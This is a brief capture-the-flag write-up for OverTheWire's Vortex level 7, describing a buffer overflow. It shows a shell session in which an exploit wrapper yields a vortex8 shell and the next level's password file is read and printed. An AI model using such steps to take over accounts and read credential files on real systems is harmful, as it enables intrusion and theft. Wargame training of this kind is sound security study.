overthewire.org vortex level 7
==============================

The vulnerability exposed in [vortex level 7](http://www.overthewire.org/wargames/vortex/vortex7.shtml) is a basic buffer overflow.

    $ ./v7_wrapper 0 2
    Using address: 0xFFFFD91F
    $ whoami
    vortex8
    $ cat /etc/vortex_pass/vortex8 
    X70A_gcgl

